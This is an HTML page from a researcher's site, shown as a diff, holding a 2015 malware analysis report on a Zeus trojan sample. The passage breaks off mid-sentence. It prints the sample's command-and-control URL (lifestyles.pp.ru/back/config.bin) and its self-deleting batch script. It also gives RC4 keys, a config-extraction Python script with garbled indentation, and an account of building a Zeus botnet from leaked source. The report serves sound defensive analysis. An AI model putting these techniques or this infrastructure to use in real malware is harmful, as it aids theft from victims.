@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Duy Phuc  Pham | Zeus malware analysis report</title>
+<meta name="description" content="Dr. Pham Duy Phuc webpage
+">
+
+<!-- Open Graph -->
+
+
+<!-- Bootstrap & MDB -->
+<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet" integrity="sha512-MoRNloxbStBcD8z3M/2BmnT+rg4IsMxPkXaGh2zD6LGNNFE80W3onsAhRcMAMrSoyWL9xD7Ert0men7vR8LUZg==" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.19.1/css/mdb.min.css" integrity="sha512-RO38pBRxYH3SoOprtPTD86JFOclM51/XTIdEPh5j8sj4tp8jmQIx26twG52UaLi//hQldfrh7e51WzP9wuP32Q==" crossorigin="anonymous" />
+
+<!-- Fonts & Icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css"  integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.0/css/academicons.min.css" integrity="sha512-W4yqoT1+8NLkinBLBZko+dFB2ZbHsYLDdr50VElllRcNt2Q4/GSs6u71UHKxB7S6JEMCp5Ve4xjh3eGQl/HRvg==" crossorigin="anonymous">
+<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons">
+
+<!-- Code Syntax Highlighting -->
+<link rel="stylesheet" href="https://gitcdn.link/repo/jwarby/jekyll-pygments-themes/master/github.css" />
+
+<!-- Styles -->
+<link rel="shortcut icon" href="/assets/img/favicon.ico">
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<link rel="canonical" href="/arch/6_arch/">
+
+<!-- Theming-->
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-25Z3QPHEXC"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'G-25Z3QPHEXC');
+  </script>
+
+
+    
+<!-- MathJax -->
+<script type="text/javascript">
+  window.MathJax = {
+    tex: {
+      tags: 'ams'
+    }
+  };
+</script>
+<script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js"></script>
+<script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+
+
+  </head>
+
+  <body class="fixed-top-nav ">
+
+    <!-- Header -->
+
+    <header>
+
+    <!-- Nav Bar -->
+    <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top">
+    <div class="container">
+      
+      <a class="navbar-brand title font-weight-lighter" href="https://phuc.fr/">
+       <span class="font-weight-bold">Duy Phuc</span>   Pham
+      </a>
+      
+      <!-- Navbar Toogle -->
+      <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar top-bar"></span>
+        <span class="icon-bar middle-bar"></span>
+        <span class="icon-bar bottom-bar"></span>
+      </button>
+      <div class="collapse navbar-collapse text-right" id="navbarNav">
+        <ul class="navbar-nav ml-auto flex-nowrap">
+          <!-- About -->
+          <li class="nav-item ">
+            <a class="nav-link" href="/">
+              about
+              
+            </a>
+          </li>
+          
+          <!-- Other pages -->
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          <li class="nav-item ">
+              <a class="nav-link" href="/projects/">
+                projects
+                
+              </a>
+          </li>
+          
+          
+          
+          <li class="nav-item ">
+              <a class="nav-link" href="/publications/">
+                publications
+                
+              </a>
+          </li>
+          
+          
+          
+          <li class="nav-item ">
+              <a class="nav-link" href="/talks/">
+                talks
+                
+              </a>
+          </li>
+          
+          
+          
+          <li class="nav-item ">
+              <a class="nav-link" href="/teaching/">
+                teaching
+                
+              </a>
+          </li>
+          
+          
+          
+          <li class="nav-item ">
+              <a class="nav-link" href="/arch/">
+                virus-archives
+                
+              </a>
+          </li>
+          
+          
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+</header>
+
+
+    <!-- Content -->
+
+    <div class="container mt-5">
+      <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Zeus malware analysis report</h1>
+    <p class="post-description">2015</p>
+  </header>
+
+  <article>
+    <p><strong>ZEUS MALWARE ANALYSIS REPORT</strong></p>
+
+<p>Pham Duy Phuc</p>
+
+<h1 id="contents">Contents</h1>
+
+<p><a href="#introduction">1. Introduction</a></p>
+
+<p><a href="#zeus-sample-analysis">2. Zeus Sample Analysis</a></p>
+
+<p><a href="#dynamic-malware-analysis">2.1. Dynamic Malware Analysis</a></p>
+
+<p><a href="#network-activities">2.1.1. Network Activities</a></p>
+
+<p><a href="#automated-dynamic-analysis">2.1.2. Automated dynamic analysis</a></p>
+
+<p><a href="#static-malware-analysis">2.2. Static Malware Analysis</a></p>
+
+<p><a href="#automated-static-analysis">2.2.1. Automated static analysis</a></p>
+
+<p><a href="#manual-malware-reverse-analysis">2.2.2. Manual malware reverse analysis</a></p>
+
+<p><a href="#zeus-botnet-reconstruction">3. Zeus botnet reconstruction</a></p>
+
+<p><a href="#summary">4. Summary</a></p>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>The analyzed sample is one of Zeus botnet’s family. This sample would
+not be analyzed or submit to any online analysis services. The analysis
+report consists of 2 parts: malware analysis (static and dynamic
+analysis) and reconstruction of a real Zeus botnet. The following
+sections outline our analysis results.</p>
+
+<h1 id="zeus-sample-analysis">Zeus Sample Analysis</h1>
+
+<p>The attachment received were as shown below:</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image-20220320212552691-7807958.png" alt="image-20220320212552691" /></p>
+
+<p>In order to analyze the executable code, I employ a combination of
+static and dynamic analysis techniques. Static analysis is the analysis
+of a program’s source or byte code to determine behaviors. Besides,
+dynamic analysis is necessary to uncover behaviors too complicated for
+static analysis, or discover flaws in program logic only known at
+runtime. These analyzed steps will be implemented simultaneously in
+order to complement each other.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image-20220320212615277.png" alt="image-20220320212615277" /></p>
+
+<p>Figure 1 Methodology</p>
+
+<h2 id="dynamic-malware-analysis">Dynamic Malware Analysis</h2>
+
+<p>The paper [1] implement an automated approach to extract malware
+behaviors by observing all the system functions calls in virtualized
+environment. A virtualized 32-bit machine is created through VMWare with
+Windows XP system and a host-only network infrastructure. Malware must
+never be executed on any host systems because it may harm to the
+computer or other devices in network.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image-20220320212645603.png" alt="image-20220320212645603" /></p>
+
+<p>Figure 2 Malware analysis environment</p>
+
+<h3 id="network-activities">Network Activities</h3>
+
+<p>FakeNet[2] is a tool that simulates network so that malware
+interacting with a remote host continues to run allowing the analyst to
+observe the malware’s network activities within a safe environment. The
+tool runs on Windows OS and requires no 3rd party libraries, support the
+most common protocols used by malware, and keep the malware running so
+that you can observe as much of its functionality as possible. It also
+export captured network activities to a PCAP file which can be analyzed
+by using Wireshark.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\[DNS Query Received.\]
+
+Domain name: lifestyles.pp.ru
+
+\[DNS Response sent.\]
+
+\[Received new connection on port: 80.\]
+
+\[New request on port 80.\]
+
+GET /back/config.bin HTTP/1.1
+
+Accept: \*/\*
+
+Connection: Close
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+Host: lifestyles.pp.ru
+
+Cache-Control: no-cache
+
+\[Sent http response to client.\]
+</code></pre></div></div>
+
+<p>The binary tried connecting to <code class="language-plaintext highlighter-rouge">lifestyles.pp.ru</code> and download config.bin.
+It could be the configuration of the malware however we will verify this
+behavior when looking in deeper after.</p>
+
+<h3 id="automated-dynamic-analysis">Automated dynamic analysis</h3>
+
+<p><img src="/assets/img/arch/zeus.assets/image-20220320212747962.png" alt="image-20220320212747962" /></p>
+
+<p>Figure 3 Cuckoo Sandbox setup environment</p>
+
+<p>First, I used ProcMon [2] which is an advanced monitoring tool for
+Windows shows real-time file system, Registry and process/thread
+activity. However, it is difficult to keep overall track of created
+files and processes which is triggered by the malware. Therefore, I
+built a Cuckoo Sandbox environment [3] which is a malware analysis
+system where you can throw any suspicious file and it will provide
+detailed results outlining what such file did when executed inside an
+isolated environment.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>**Opened files**
+
+\\\\?\\PIPE\\lsarpc
+
+C:\\Documents and Settings\\Admin\\Cookies\\admin@google\[1\].txt
+
+C:\\Documents and Settings\\Admin\\Cookies\\admin@python\[1\].txt
+
+**C:\\Documents and Settings\\Admin\\Application Data\\Abdo\\yzxo.gug**
+
+Written files
+
+\\\\?\\PIPE\\lsarpc
+
+C:\\Documents and Settings\\Admin\\Application Data\\Abdo\\yzxo.gug
+
+Files Read
+
+\\\\?\\PIPE\\lsarpc
+
+C:\\Documents and Settings\\Admin\\Cookies\\admin@google\[1\].txt
+
+C:\\Documents and Settings\\Admin\\Cookies\\admin@python\[1\].txt
+
+**Process ZeusBinary.exe (852)**
+
+Opened files
+
+C:\\Documents and Settings\\Admin\\Application Data\\Abdo\\yzxo.gug
+
+C:\\Documents and Settings\\Admin\\Local Settings\\Temp\\ZeusBinary.exe
+
+C:\\Documents and Settings\\Admin\\Application Data
+
+**C:\\Documents and Settings\\Admin\\Application Data\\Ufra\\yfakc.exe**
+
+Written files
+
+**C:\\Documents and Settings\\Admin\\Local
+Settings\\Temp\\tmpe7bd73b9.bat**
+
+C:\\Documents and Settings\\Admin\\Application Data\\Ufra\\yfakc.exe
+
+Files Read
+
+C:\\Documents and Settings\\Admin\\Local Settings\\Temp\\ZeusBinary.exe
+
+**Process yfakc.exe (1704)**
+
+Opened files
+
+C:\\Documents and Settings\\Admin\\Application Data\\Ufra\\yfakc.exe
+
+Written files
+
+\\\\?\\PIPE\\lsarpc
+
+Files Read
+
+C:\\Documents and Settings\\Admin\\Application Data\\Ufra\\yfakc.exe
+
+**Process cmd.exe (112)**
+
+Opened files
+
+\\\\?\\PIPE\\lsarpc
+
+C:\\Documents and Settings\\Admin\\Local Settings\\Temp\\tmpe7bd73b9.bat
+
+</code></pre></div></div>
+
+<p>The sample created and dropped 2 directories, 2 files in <code class="language-plaintext highlighter-rouge">%AppData%</code> and a
+batch script in <code class="language-plaintext highlighter-rouge">%Temp%</code>. It also created a start up registry key to make
+the malware being executed each time the victim’s machine starts.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image1.png" alt="" /></p>
+
+<p>Figure 4 Cuckoo sandbox on running</p>
+
+<p><strong>Self-removal through batch script</strong>: The malware used a technique to
+remove itself after installing. Therefore, it is no chance for victim to
+grab the original malicious binary which could be analysed after
+executing it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@**echo** off
+
+**:d**
+
+**del** \"C:\\Documents and Settings\\Admin\\Local
+Settings\\Temp\\ZeusBinary.exe\"
+
+**if exist** \"C:\\Documents and Settings\\Admin\\Local
+Settings\\Temp\\ZeusBinary.exe\" **goto** d
+
+**del** /F \"C:\\DOCUME\~1\\Admin\\LOCALS\~1\\Temp\\tmpe7bd73b9.bat\"
+</code></pre></div></div>
+
+<h2 id="static-malware-analysis">Static Malware Analysis</h2>
+
+<h3 id="automated-static-analysis">Automated static analysis</h3>
+
+<p>PEview[4] provides a quick and easy way to view the structure and
+content of 32-bit Portable Executable (PE) files. It displays header,
+section, directory, import table, export table, and resource information
+within EXE, DLL, OBJ files.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image2.png" alt="" /></p>
+
+<p>Figure 5 PEView results</p>
+
+<p>Figure 4 shows that the malware might be built on 19/12/2013, however
+this value can be faked.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image3.png" alt="" /></p>
+
+<p>Figure 6 Imported libraries and functions</p>
+
+<p>The sample import many suspicious functions such as: CreateThread,
+ReadFile, WriteFile, CreateDirectory, HttpOpenRequest, etc. These
+functions are suspicious and may attempt to execute child process,
+read/write/delete files or connect to the outside environment. Functions
+name ended with “A” means ASCII format and “W” means Unicode result.</p>
+
+<p>PEiD [5] is an application that detects packers, cryptors and
+compilers found in PE executable files – its detection rate is higher
+than that of other similar tools since the app packs more than 600
+different signatures in PE files. PEiD comes with three different
+scanning methods, each suitable for a distinct purpose. The Normal one
+scans the user-specified PE file at its Entry Point for all its included
+signatures. The so-called Deep Mode comes with increased detection ratio
+since it scans the file's Entry Point containing section, whereas the
+Hardcore mode scans the entire file for all the documented signatures.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>**CRC32** \[poly\] :: 00013B81 :: 00414781
+
+The reference is above.
+
+CryptCreateHash \[Import\] :: 00000458 :: 00401058
+
+Referenced (Hash: **MD5**) at 00414693
+
+CryptHashData \[Import\] :: 00000474 :: 00401074
+
+Referenced at 004146AF
+</code></pre></div></div>
+
+<p>PeID did not find any packer in Zeus binary sample, however it found
+CRC32 and md5 functions which are known as 32bit hash checksum in the
+malware.</p>
+
+<h3 id="manual-malware-reverse-analysis">Manual malware reverse analysis</h3>
+
+<p>IDA is the Interactive DisAssembler [6] with most feature-full
+disassembler, which many software security specialists are familiar
+with. The unique Hex-Rays decompiler delivers on the promise of high
+level representation of binary executables.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image4.png" alt="" />
+Figure 7 Sample’s Flow Graph</p>
+
+<p>The Fig. 3 shows a call graph of sample which has many function branches
+and difficult to trace the flow of running. I used the <strong>taint trace</strong>
+function of IDA when debugging to see the real flow of this malware
+sample. Taint analysis are used to analyze how information flows through
+a malware binary, explore trigger-based behavior, and detect emulators.
+IDA tool supports record, compare and replay trace results.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000518 .text:sub_4120C4 Memory layout changed: 128 segments Memory
+layout changed: 128 segments
+
+00000518 .text:start+B call sub_4120C4 start call sub_4120C4
+
+00000518 .text:sub_4120C4:loc_4120EB call sub_411D74 sub_4120C4 call
+sub_411D74
+
+00000518 .text:sub_411D74+39 retn sub_411D74 returned to sub_4120C4+2C
+
+00000518 .text:sub_4120C4+41 call ds:GetModuleHandleW sub_4120C4 call
+kernel32.dll:kernel32_GetModuleHandleW
+
+00000518 .text:sub_4120C4+10F call sub_40F964 sub_4120C4 call sub_40F964
+
+00000518 .text:sub_40F964+49 retn sub_40F964 returned to sub_4120C4+114
+
+00000518 .text:sub_4120C4+117 call ds:GetModuleHandleW sub_4120C4 call
+kernel32.dll:kernel32_GetModuleHandleW
+
+00000518 .text:sub_4120C4+136 call esi ; GetProcAddress sub_4120C4 call
+kernel32.dll:kernel32_GetProcAddress
+
+00000518 .text:sub_4120C4+148 call esi ; GetProcAddress sub_4120C4 call
+kernel32.dll:kernel32_GetProcAddress
+
+00000518 .text:sub_4120C4+15A call esi ; GetProcAddress
+
+sub_4120C4 call kernel32.dll:kernel32_HeapCreate
+
+00000518 .text:sub_4120C4+205 call ds:InitializeCriticalSection
+sub_4120C4 call kernel32.dll:kernel32_InitializeCriticalSection
+
+00000518 .text:sub_4120C4+21B call ds:**WSAStartup** sub_4120C4 call
+ws2_32.dll:ws2_32\_**WSAStartup**
+
+00000518 .text:sub_4120C4+224 call sub_411DAE sub_4120C4 call sub_411DAE
+
+00000518 .text:sub_411DAE+8 call sub_414BC2 sub_411DAE call sub_414BC2
+
+00000518 .text:sub_414BC2+D call ds:GetModuleHandleW sub_414BC2 call
+kernel32.dll:kernel32_GetModuleHandleW
+
+00000518 .text:sub_414BC2+1D call ds:GetProcAddress sub_414BC2 call
+kernel32.dll:kernel32_GetProcAddress
+
+00000518 .text:sub_414BC2+2D call eax sub_414BC2 call
+kernel32.dll:kernel32_IsWow64Process
+
+00000518 .text:sub_414BC2+3F retn sub_414BC2 returned to sub_411DAE+D
+
+00000518 .text:sub_411DAE+24 call sub_4169AA sub_411DAE call sub_4169AA
+
+\--snippet---
+
+00000518 .text:sub_41973F+42 call sub\_**4133F7** sub_41973F call
+sub_4133F7
+
+00000518 .text:sub_4133F7+14 retn 0Ch sub_4133F7 returned to
+sub_41973F+47
+
+00000518 .text:sub_41973F+53 call sub\_**414837** sub_41973F call
+sub_414837
+
+00000518 .text:sub_414837+6E retn 8 sub_414837 returned to
+sub_41973F:loc_419797
+
+00000518 .text:sub_41973F+42 call sub\_**4133F7** sub_41973F call
+sub_4133F7
+
+00000518 .text:sub_4133F7+14 retn 0Ch sub_4133F7 returned to
+sub_41973F+47
+
+00000518 .text:sub_41973F+53 call sub\_**414837** sub_41973F call
+sub_414837
+
+00000518 .text:sub_414837+6E retn 8 sub_414837 returned to
+sub_41973F:loc_419797
+
+00000518 .text:sub_41973F+42 call sub\_**4133F7** sub_41973F call
+sub_4133F7
+</code></pre></div></div>
+
+<p>The first function at 0x4120C4 requests information of itself: PID,
+executable path, etc. through kernel32 library. The malware then check
+for command arguments and based on these arguments it will decide to
+execute: update; self-remote; VNC remote control (see 3.Zeus botnet
+reconstruction). It verifies the version of operating system using
+kernel32.GetVersionExW() and seems to be supported by Windows
+(PC/Server) from version 5.0 to 6.1 (XP to Windows 7/ Windows Server
+2003 to 2008).</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image5.png" alt="" /></p>
+
+<p>Figure 8 Malware cases</p>
+
+<p>The function at 0x00412D01 is the initial procedure which creates Mutex
+then reads its executable contents to a heap memory. Referring to C code
+RC4 encryption scheme [7], the malware uses RC4 to decrypt then check
+the decrypted cipher text is equal to "<strong>DAVE</strong>" and verifies CRC32
+checksum at 0x412975 using rc4 key at dword 4026F0 then make a stream
+cipher at 0x4147D4.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image6.png" alt="" /></p>
+
+<p>Figure 9 Function 0x4147D4 RC4 Initialization</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image7.png" alt="" /></p>
+
+<p>Figure 10 Apple RC4 implementation in C</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image8.png" alt="" /></p>
+
+<p>Figure 11 RC4 Crypt function</p>
+
+<p>The first decryption key is hardcoded in the binary from address
+0x403730.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image9.png" alt="" /></p>
+
+<p>Figure 12 The first decryption key</p>
+
+<p>After initializing KSA phase of RC4 encryption, the malware sample read
+each 0x102 (258 bytes) of itself and decrypt with the first key. This
+while loop will last until the decrypted result has the header “DAVE”,
+apparently this technique makes the program runs longer (nearly 90
+seconds in python implementation), hard to debug and avoid embedding the
+address of ciphertext in assembly. However the ciphertext actually
+locates in the end of the binary contents (usually from 0x22800).</p>
+
+<p>Furthermore, the decrypted result contains 4bytes header “DAVE”,
+CRC32Hash, <em>info</em>, Sizetodecode, XORkey. There are 2 cases: installer
+and injector depends on <em>info</em> field, if the value is <strong>0x0c</strong> then it
+is still in installation phase if it is <strong>0x1e6</strong> then it has been
+replaced by installation routine with a new packer data structure .</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image10.png" alt="" /></p>
+
+<p>Figure 13 Configuration XOR Decryption</p>
+
+<p>It generates new key by XOR between old RC4 key and a permutation table.
+The Xor key in the installation phase is a 4bytes string “720DC80F”
+(extracted from the first decrypted string). VirtualProtect function
+changes the protection on a region of committed pages in the virtual
+address space of the calling process, in this case it changes from
+PAGE_EXECUTE_READWRITE to PAGE_EXECUTE_READ.[8]</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image11.png" alt="" /></p>
+
+<p>Figure 14 Key generation</p>
+
+<p>By recognizing the value “6C078965”, the function at 0x4146F4 is the
+seed generator of Mersenne Twister pseudorandom number generator [9]
+(as known as mt_rand function). I figured out the malware create a
+random name from 2 lists: “<em>bcdfghklmnpqrstvwxz</em>” and “<em>aeiouy</em>” to
+construct a default 4-character directory name and 5-character “.exe”
+file name with first uppercase character. Thereafter, the malware packs
+values of Registry keys, PRNG seed, local path name, computer name and
+version and encrypted using RC4, replaces the old ciphertext at the end
+of the original binary with new ciphertext then write to <code class="language-plaintext highlighter-rouge">%AppData%\\
+{Random_Directory} \\{Random_Name}.exe</code>. Besides, they created a new
+configuration file in <code class="language-plaintext highlighter-rouge">%AppData%\\ {Random_Directory}
+\\{Random_Name}.{Random_ext}</code>. This result will be useful in writing
+regex rules for auto removal tool. I also verify this result by
+comparing 2 binaries’ flow graphs by using BinDiff [10] which is a
+comparison tool for binary files, that assists vulnerability researchers
+and engineers to quickly find differences and similarities in
+disassembled code. The 2 binaries have the same disassembly code but a
+small difference at the end of the resource field.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image12.png" alt="" /></p>
+
+<p>Figure 15 BinDiff among original binary and dropped executable</p>
+
+<p>The dropped binary will be called by CreateProcessW and execute the
+injection case (<strong>0x1e6</strong>). It can be triggered by using debugging
+attach with one of these techniques:</p>
+
+<ul>
+  <li>
+    <p>Create a new process using CreateProcess and change the
+  dwCreationFlags in stack from <code class="language-plaintext highlighter-rouge">CREATE_DEFAULT_ERROR_MODE (0x4000000)</code>
+  to <strong>CREATE_SUSPENDED</strong> (0x4). Then attach to the suspended process
+  using IDA/Ollydbg, and resume all threads.</p>
+  </li>
+  <li>
+    <p>Edit the dumped PE file in %AppData% and change the bytes at the
+  entry point to “<strong>EB FE</strong>” which jumps to itself in an infinite loop
+  or “<strong>CC</strong>” which is INT3 and will hang and ask for debugging. Then
+  attach to the suspended process using IDA/Ollydbg and restore the
+  original bytes at the entrypoint and resume the process.</p>
+  </li>
+</ul>
+
+<p><img src="/assets/img/arch/zeus.assets/image13.png" alt="" /></p>
+
+<p>Figure 16 Zeus configuration archive</p>
+
+<p>The new process requests for remote configuration (<code class="language-plaintext highlighter-rouge">/back/config.bin</code>),
+update new rc4 key (if needed). At this point, we can make a fake
+lifestyles.pp.ru by changing host windows IP located at
+<code class="language-plaintext highlighter-rouge">%system32%/drivers/etc/hosts</code> and build old pieces of configuration
+binary grabbed from ZeusTracker.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image14.png" alt="" /></p>
+
+<p>Figure 17 Create new process from dropped binary</p>
+
+<p>In section 2.1.1, the malware send a GET request to an URL with
+user-agent <code class="language-plaintext highlighter-rouge">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"</code>,
+and there is a hardcoded string <code class="language-plaintext highlighter-rouge">"Mozilla/4.0 (compatible; MSIE 7.0;
+Windows NT 5.1; SV1)"</code> in the binary can be referred to function
+0x414F8F. However, this function was not raised breakpoint in live
+debugging because the malware set the default user agent by calling the
+function <code class="language-plaintext highlighter-rouge">ObtainUserAgentString</code> in <code class="language-plaintext highlighter-rouge">urlmon.dll</code>.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image15.png" alt="" /></p>
+
+<p>Figure 18 XREFs of user agent string</p>
+
+<p>We can also trigger the communication process by setting breakpoints at
+Wininet library: <code class="language-plaintext highlighter-rouge">InternetReadFile</code> and <code class="language-plaintext highlighter-rouge">HTTPOpenRequestA</code>. Ollydbg is a
+powerful tool to attach and debug inside kernel library running on
+explorer.exe. However, both IDA and Ollydbg sometimes crash this
+critical process and hang on running.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image16.png" alt="" /></p>
+
+<p>Figure 19 Ollydbg triggered HTTPOpenRequestA</p>
+
+<p>For communication, the malware continues XOR the first ciphertext with
+key from address 0x21000 to get configuration values include
+configuration URL, RC4 key.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image17.png" alt="" /></p>
+
+<p>Figure 20 RC4 key of network communication</p>
+
+<p>This is the automated configuration extraction written using Python:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data = open("ZeusBinary.bin","rb").read()
+key = "2A83FADF8B5852AA3F7D46D5728738ABA4D1685698A3AAA5E723381148405384AEC5ADF372 F5EDE2CBD43A186457C35B1D3B303B54322FF145DF6BE0D7FB4634F2FAC2F13EAA4A117D6D3 EA3DCDA67A6ED13FDCC51CC6ED64CD9C2E43A45A51A39EABD31663D7D7C545E794932BFD3CC 158A96D966F01093F5C18D5C562139A1432BCE8CA2AAB0E4483955DF368689C3345268F24BC D7554C848B406E313B855BA5997489550914FD24C74137E483B5F7D5E4F124F525A5B555A6A 5F2553544FE1D821EDF79A52C961A8C32CF2BAFEC587C1C3139FFAA07F5738A360596F0B26E D00FBA4D8C429ED7568FE1FDAD3E60E1C9C53C8DD776D2CA59EED5E7EB84AF39555D354963B D681877AD95F50B78FF9902DCD678C87A5F46CE1FB968E9D360F5069B157980ACB578572BCC
+514FEB95D540AA1416BBE302EA4953463012EA7D0DED625816D3F483F726BD62C8C3FFB9326 CEB7B142374EAF46D6429A1508CD916F3526AD48A3E9AE437A74D553992A4ADC305AB09986B 7DFE9B4DB9A544F30261C901E3D2F94A26EC2353A580618CAD712E8DF3D59C382E53E53E0A4 3D606FE05CA41B66B8D37D9B02990759C2622B3D5B183C4795B97E20564A249B6094B272A66 E9F7DF6D88DC638471B8F5DA8D8F798B06C163F40798BC0273AD7272C81495EA69CE842486D E669ACD7EC324F286088542E3A05C803F06CCE15E1A5C4676C7984F336EC651E5F57AA0EB68 3DC1B106AF720139528DDC28632FF7DE7C23E1E2024C3207370C7CA630FE1C1FDC8B310BA43 F70DA9F45AE6663B8CEEB23AC05B7CA80FAFEB52940AE80E01FAB2B5A0551B300EDE6103482 C74AFBC91D4C222D40AF17C834D81C85A37D9EA18829D0813CD1C21332C533F7608F98B5669 AE8B1469CF4690B199678C7A62DF8BDF733E6A302F4ECA0B9FA7B276391A69316001087ABFE 55412363B5887D7BFC9A2294D7646C72052C470BC301E37453F34FEFDCD830AF637C7DED761 38AD8D673E72E0E46CAE999B5D4A23690C238F08437576C4EC3805399B954F12662295117BF 8429715A434ED5B9D4F63108E4E05DCEB03BE7ABF895646937DA93576138827D71C67A9D44F 1A857CC2F1534D563773FB2A7F78A856AFF072700D1C2E822F3F0AE7AE".decode("hex") #KSA Phase
+for k in range(0, len(data)-0x102):
+    # k=0x22800
+input = data[k:k+0x102] S = range(256)
+j=0
+out = []
+for i in range(256):
+j = (j + S[i] + ord( key[i % len(key)] )) % 256 S[i] , S[j] = S[j] , S[i]
+#PRGA Phase i=j=0
+for char in input:
+        i = ( i + 1 ) % 256
+        j = ( j + S[i] ) % 256
+S[i] , S[j] = S[j] , S[i]
+out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256])) if ''.join(out)[0:4] == "DAVE": break
+decrypted_text = ''.join(out)
+print decrypted_text.encode("hex") xor_key = data[0x21000:0x21000+len(key)]
+l = [ord(a) ^ ord(b) for a,b in zip(key,xor_key)] config = ''.join(chr(i) for i in l)
+url=""
+i=0
+while 1:
+    url += config[0x97+i]
+    i+=1
+    if config[0x97+i] =="\x00":
+break
+print "config url = ", url
+print "RC4 communication key = ", config[0x1a4:0x1a4+512].encode("hex")
+</code></pre></div></div>
+
+<p>Result:</p>
+
+<p>config url = <strong><a href="http://lifestyles.pp.ru/back/config.bin">http://lifestyles.pp.ru/back/config.bin</a></strong></p>
+
+<p>RC4 communication key =
+<strong>7ce3b1abd6a9db692652c70daf28c07791887211427b38aa44a59e43925fa34cb2e9c1f76c7647be3999b4c6ec811027bb71f5ba5416a6e6831d3578e29758d98e79b9d7b59d33ddde7edc5174652a0809fa17c270fc31d389f6535e45b6b704a0574a6d0b986a84efee6f2212c5a421051a41f02e004b4fe7823e1e6824c320a7491ff3bf3601f819f15b29567a07345dcda2df9a028cd49c0680672d94cf930f6e8537cc302bc4cb8b1b6bd20ef2e07d3c60132f90caae75fd8debd0ce96bc4dd1c85a3fd8ea188fad1423e82c0a0348634e469bc915663a9fd525dafeffa17fa8b3bdfb50f4b8ed407359641c3bf9b0ac8786610c325ce555e43d958ae16200006a6edae1d8ffd51fcf40dbf1ef642246b407000000086cc987fa0d3d620073e90756de9a60502b4acbdc5696c3a33d72bc51a61b4e30844d96fc0100010091ac6b2b5f1bd02827c120ae6f9db0d4c0a4ee5aa9b78d3c06d2e38783868f6c5ba95e93664c70b252ed965d30eeff20334614cbb577a00d7bc034443a93ca945a49a836f91587133336f592</strong></p>
+
+<p>[Finished in 92.6s]</p>
+
+<h1 id="zeus-botnet-reconstruction">Zeus botnet reconstruction</h1>
+
+<p>Source code for version 2.0.8.9 of the ZeuS malware has been leaked on
+the internet since 2011. I grabbed the open source code [11] to deploy
+a whole Zeus system running on local machines. These system will help us
+fully understand the activities among both C&amp;C server and clients.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image18.png" alt="" /></p>
+
+<p>Figure 21 Zeus build</p>
+
+<p>This source code includes: server build (executable and PHP) for running
+C&amp;C server, builder (exe) to build zombie malware similar to our sample.
+It built based on Microsoft Visual Studio, PHP and Apache Server.
+However, I have to refer to another leaked botnet source-code [12] to
+modify and build full Zeus kit.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image19.png" alt="" /></p>
+
+<p>Figure 22 Zeus bot executable and configuration builds</p>
+
+<p>The control panel can filter the victims by country, IP-addresses,
+NAT-status, desktop screenshots in real time, detailed information about
